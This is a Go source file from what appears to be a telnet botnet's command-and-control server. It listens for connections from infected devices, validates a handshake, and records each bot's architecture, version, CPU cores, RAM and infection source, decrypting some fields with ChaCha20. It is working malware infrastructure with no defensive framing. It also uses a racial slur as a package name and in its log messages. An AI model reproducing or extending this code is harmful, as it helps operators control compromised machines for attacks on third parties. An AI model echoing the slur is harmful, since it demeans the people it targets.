package slave_v2

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/niggers/encryption"
	"fmt"
	"io"
	"net"
	"strings"
	"time"
)

func Serve() {
	tel, err := net.Listen("tcp", fmt.Sprintf(":%d", config.Slave.SlavePort))
	if err != nil {
		config.Logger.Fatal("Failed to listen for niggers connections", "port", config.Slave.SlavePort, "err", err)
	}

	config.Logger.Info("Listening for niggers connections", "port", config.Slave.SlavePort)

	for {
		conn, err := tel.Accept()
		if err != nil {
			config.Logger.Error("Failed to accept connection", "err", err)
			continue
		}

		go initialHandler(conn)
	}
}

func initialHandler(conn net.Conn) {
	defer conn.Close()

	// 2026 Standard: Tight deadlines for initial handshake
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	buf := make([]byte, 4)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return
	}

	// 2026 Standard: Improved protocol validation
	if buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			var arch = Read(conn, false)
			var version = Read(conn, false)

			if version == "d3d7595e" || version == "unk" {
				config.Logger.Warn("Rejected suspicious bot connection", "remote", conn.RemoteAddr().String())
				return
			}

			// Map legacy versions to modern ones
			switch version {
			case "481c3fe":
				version = "1.9.7"
			case "d846cda1":
				version = "1.9.8"
			case "d3d7595e2":
				version = "1.9.9"
			}

			if !(version == "1.9.7" || version == "1.9.8") {
				var cores = Read(conn, version != "1.9.9")
				var ram = Read(conn, version != "1.9.9")
				var source = Read(conn, version != "1.9.9")
				
				// Standardize source name
				source = strings.TrimSpace(strings.ToLower(source))
				if source == "" {
					source = "unknown"
				}

				Handle(conn, arch, version, source, cores, ram)
				return
			}

			var source = Read(conn, false)
			Handle(conn, arch, version, strings.ToLower(source), "unk", "unk")
		}
	}
}

func Read(conn net.Conn, decrypt bool) string {
	stringLen := make([]byte, 1)
	if _, err := io.ReadFull(conn, stringLen); err != nil {
		return ""
	}

	var source string
	if stringLen[0] > 0 {
		sourceBuf := make([]byte, stringLen[0])
		if _, err := io.ReadFull(conn, sourceBuf); err != nil {
			return ""
		}

		if decrypt {
			encryption.Chacha20(encryption.Key, 1, encryption.Nonce, sourceBuf, sourceBuf)
		}

		source = string(sourceBuf)
	}

	if len(source) < 1 {
		source = "unk"
	}

	return source
}
